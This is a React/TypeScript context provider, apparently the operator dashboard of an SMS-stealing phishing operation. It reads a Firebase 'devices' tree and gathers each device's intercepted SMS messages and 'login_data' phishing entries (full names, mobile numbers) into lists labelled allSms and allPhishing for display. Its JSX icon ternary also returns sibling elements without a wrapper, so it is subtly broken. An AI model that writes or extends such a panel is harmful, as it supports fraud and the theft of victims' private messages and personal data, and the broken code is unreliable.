import { createContext, useContext, useEffect, useRef, useState, type ReactNode } from 'react'
import { db, ref, onValue, off } from './firebase'

interface AppState {
  devices: Record<string, any>
  allSms: any[]
  allPhishing: any[]
  connected: boolean
  lastUpdate: string
}

interface Toast {
  id: number
  message: string
  type: 'success' | 'error' | 'info'
}

interface AppContextValue extends AppState {
  toast: (message: string, type?: 'success' | 'error' | 'info') => void
  refresh: () => void
}

const AppContext = createContext<AppContextValue>(null!)

let toastId = 0

export function AppProvider({ children }: { children: ReactNode }) {
  const [state, setState] = useState<AppState>({
    devices: {}, allSms: [], allPhishing: [], connected: false, lastUpdate: 'Never'
  })
  const [toasts, setToasts] = useState<Toast[]>([])
  const devicesRef = useRef<Record<string, any>>({})

  const addToast = (message: string, type: 'success' | 'error' | 'info' = 'info') => {
    const id = ++toastId
    setToasts(prev => [...prev, { id, message, type }])
    setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), 3500)
  }

  useEffect(() => {
    const devicesListener = onValue(ref(db, 'devices'), (snap) => {
      const devices = snap.val() || {}
      devicesRef.current = devices
      const allSms: any[] = []
      const allPhishing: any[] = []
      Object.entries(devices).forEach(([devId, dev]: [string, any]) => {
        Object.entries(dev).forEach(([key, val]) => {
          if (key === 'sms' && typeof val === 'object') {
            Object.entries(val as object).forEach(([ts, msg]: [string, any]) => {
              allSms.push({ ...msg, deviceId: devId, _ts: ts })
            })
          }
        })
      })
      const loginSnap = devices as any
      Object.entries(devices).forEach(([devId, dev]: [string, any]) => {
        if (dev.login_data && typeof dev.login_data === 'object') {
          Object.entries(dev.login_data as object).forEach(([_, entry]: [string, any]) => {
            if (entry.fullName || entry.mobile) {
              allPhishing.push({ deviceId: devId, ...entry })
            }
          })
        }
      })
      allSms.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
      setState(prev => ({
        ...prev, devices, allSms, allPhishing,
        lastUpdate: new Date().toLocaleTimeString()
      }))
    })

    const connListener = onValue(ref(db, '.info/connected'), (snap) => {
      setState(prev => ({ ...prev, connected: snap.val() }))
    })

    return () => {
      off(ref(db, 'devices'), 'value', devicesListener)
      off(ref(db, '.info/connected'), 'value', connListener)
    }
  }, [])

  const refresh = () => {
    addToast('Refreshing...', 'info')
    onValue(ref(db, 'devices'), (snap) => {
      off(ref(db, 'devices'), 'value')
    }, { onlyOnce: true })
    setTimeout(() => addToast('Refreshed!', 'success'), 500)
  }

  return (
    <AppContext.Provider value={{ ...state, toast: addToast, refresh }}>
      {children}
      <div className="toast-container">
        {toasts.map(t => (
          <div key={t.id} className={`toast ${t.type}`}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              {t.type === 'success' ? <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/> :
               t.type === 'error' ? <circle cx="12" cy="12" r="10"/><path d="m15 9-6 6"/><path d="m9 9 6 6"/> :
               <circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/>}
            </svg>
            {t.message}
          </div>
        ))}
      </div>
    </AppContext.Provider>
  )
}

export function useApp() {
  return useContext(AppContext)
}
